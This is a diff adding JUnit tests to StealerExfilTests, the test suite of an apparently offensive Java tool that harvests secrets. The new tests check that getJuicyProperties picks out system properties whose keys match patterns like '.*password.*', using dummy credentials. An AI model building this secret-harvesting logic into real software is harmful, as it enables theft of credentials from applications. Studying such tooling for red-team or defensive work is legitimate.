@@ -7,8 +7,10 @@ import org.junit.Test;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.Properties;
 
 import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertTrue;
 
 public class StealerExfilTests {
     @Before
@@ -17,6 +19,34 @@ public class StealerExfilTests {
         StealerExfil.CONF_FQDN_MAX_LEN = 253;
     }
 
+    @Before
+    public void setAppConfig() {
+        System.setProperty("config.database.url", "jdbc:mysql://localhost:3306/mydb");
+        System.setProperty("config.server.port", "8080");
+        System.setProperty("config.username","root");
+        System.setProperty("config.password","secret");
+        System.setProperty("application.name", "Proudhon");
+        System.setProperty("application.version", "1.0");
+    }
+
+    @Test
+    public void testMatchingOneProperty() {
+        // Act
+        StealerExfil.CONF_STEAL_THIS_PROPERTY_KEY_REGEX = ".*password.*";
+        Map<String, String> matching = StealerExfil.getJuicyProperties(System.getProperties());
+
+        // Assert
+        assertTrue("Matched system property.", matching.containsValue("secret"));
+    }
+    @Test
+    public void testMatchingMultipleProperties() {
+        // Act
+        StealerExfil.CONF_STEAL_THIS_PROPERTY_KEY_REGEX = ".*config.*";
+        Map<String, String> matching = StealerExfil.getJuicyProperties(System.getProperties());
+
+        // Assert
+        assertEquals("Matched multiple system properties.", 4, matching.size());
+    }
     @Test
     public void testSplit_SmallInput_OneRequest() {
         // Arrange
